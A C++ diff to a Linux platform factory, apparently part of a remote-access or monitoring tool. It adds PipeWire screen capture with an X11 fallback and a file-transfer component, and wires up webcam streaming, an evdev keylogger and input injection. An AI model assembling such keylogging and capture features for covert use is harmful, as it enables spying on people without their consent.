@@ -3,9 +3,11 @@
 #include "LinuxPlatformFactory.hpp"
 #include "LinuxInputInjectorFactory.hpp"
 #include "LinuxX11Streamer.hpp"
+#include "LinuxPipeWireStreamer.hpp"
 #include "LinuxWebcamStreamer.hpp"
 #include "LinuxEvdevLogger.hpp"
 #include "LinuxAppManager.hpp"
+#include "LinuxFileTransfer.hpp"
 #include <iostream>
 #include <cstdlib>
 
@@ -18,25 +20,38 @@ namespace linux_platform {
 
 std::unique_ptr<interfaces::IInputInjector> LinuxPlatformFactory::create_input_injector() {
     // Use the existing factory which handles X11 vs uinput detection
-    return LinuxInputInjectorFactory::create();
+    return linux_os::LinuxInputInjectorFactory::create();
 }
 
 std::unique_ptr<interfaces::IVideoStreamer> LinuxPlatformFactory::create_screen_streamer() {
-    // TODO: Add Wayland support (e.g., pipewire screencopy)
-    // For now, use X11 streamer
-    return std::make_unique<LinuxX11Streamer>();
+    // On Wayland, try PipeWire-based capture first
+    if (is_wayland_) {
+        auto pw_streamer = std::make_unique<linux_os::LinuxPipeWireStreamer>();
+        if (pw_streamer->is_available()) {
+            std::cout << "[LinuxPlatform] Using PipeWire streamer ("
+                      << pw_streamer->get_capture_tool() << ")" << std::endl;
+            return pw_streamer;
+        }
+        std::cout << "[LinuxPlatform] PipeWire unavailable, falling back to X11/XWayland" << std::endl;
+    }
+    // X11 or XWayland fallback
+    return std::make_unique<linux_os::LinuxX11Streamer>();
 }
 
 std::unique_ptr<interfaces::IVideoStreamer> LinuxPlatformFactory::create_webcam_streamer() {
-    return std::make_unique<LinuxWebcamStreamer>();
+    return std::make_unique<linux_os::LinuxWebcamStreamer>();
 }
 
 std::unique_ptr<interfaces::IKeylogger> LinuxPlatformFactory::create_keylogger() {
-    return std::make_unique<LinuxEvdevLogger>();
+    return std::make_unique<linux_os::LinuxEvdevLogger>();
 }
 
 std::unique_ptr<interfaces::IAppManager> LinuxPlatformFactory::create_app_manager() {
-    return std::make_unique<LinuxAppManager>();
+    return std::make_unique<linux_os::LinuxAppManager>();
+}
+
+std::unique_ptr<interfaces::IFileTransfer> LinuxPlatformFactory::create_file_transfer() {
+    return std::make_unique<linux_os::LinuxFileTransfer>();
 }
 
 // ============================================================================
